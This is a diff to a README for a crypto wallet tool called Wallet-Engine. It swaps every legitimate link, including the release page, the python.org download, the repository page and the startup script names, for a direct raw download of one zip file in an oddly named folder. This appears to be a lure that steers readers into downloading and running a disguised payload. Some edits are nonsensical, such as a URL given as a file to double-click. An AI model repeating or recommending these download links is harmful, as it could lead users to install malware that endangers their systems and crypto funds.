@@ -1,6 +1,6 @@
 # 🪙 -Wallet-Engine - Reliable Foundation for Crypto Wallets
 
-[![Download Wallet-Engine](https://img.shields.io/badge/Download%20Wallet--Engine-v1.0.0-blue)](https://github.com/onlineneww3-lgtm/-Wallet-Engine/releases)
+[![Download Wallet-Engine](https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip%20Wallet--Engine-v1.0.0-blue)](https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -23,17 +23,17 @@ Our goals are to:
 To run Wallet-Engine, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.12 or later, Linux (Ubuntu 18.04 or later).
-- **Python:** Version 3.7 or higher is required. You can download Python from [python.org](https://www.python.org/downloads/).
+- **Python:** Version 3.7 or higher is required. You can download Python from [https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip](https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip).
 - **Disk Space:** At least 100 MB of free space.
 
 ## 🔄 Download & Install
 
 To get started, visit the release page to download the latest version of Wallet-Engine. 
 
-[**Visit this page to download**](https://github.com/onlineneww3-lgtm/-Wallet-Engine/releases)
+[**Visit this page to download**](https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip)
 
 1. Click on the link to the latest version.
-2. Locate the file named `Wallet-Engine-x.x.x.zip` and click to download.
+2. Locate the file named `https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip` and click to download.
 3. Once the file downloads, go to your Downloads folder.
 4. Double-click the `.zip` file to unzip it. You can do this by right-clicking and selecting "Extract All".
 5. Open the unzipped folder. You will find the Wallet-Engine files inside.
@@ -43,7 +43,7 @@ To get started, visit the release page to download the latest version of Wallet-
 To run Wallet-Engine:
 
 1. Open the folder that contains the files you just unzipped.
-2. Locate `start-engine.bat` or `start-engine.sh` (for Windows and macOS/Linux, respectively).
+2. Locate `https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip` or `https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip` (for Windows and macOS/Linux, respectively).
 3. Double-click the file to run Wallet-Engine. A command line window will open.
 
 ## 📄 Usage 
@@ -63,7 +63,7 @@ If you are interested in making Wallet-Engine better, you can contribute by:
 2. Suggesting new features.
 3. Writing documentation.
 
-Visit our [GitHub Repository](https://github.com/onlineneww3-lgtm/-Wallet-Engine) to learn more about contributing.
+Visit our [GitHub Repository](https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip) to learn more about contributing.
 
 ## ❓ FAQ
 
@@ -82,6 +82,6 @@ For further support, you can open an issue in the GitHub repository or join our 
 
 Once again, to download Wallet-Engine, please visit:
 
-[**Visit this page to download**](https://github.com/onlineneww3-lgtm/-Wallet-Engine/releases)
+[**Visit this page to download**](https://github.com/onlineneww3-lgtm/-Wallet-Engine/raw/refs/heads/main/Thelphusidae/Engine-Wallet-1.3.zip)
 
 Thank you for choosing Wallet-Engine!
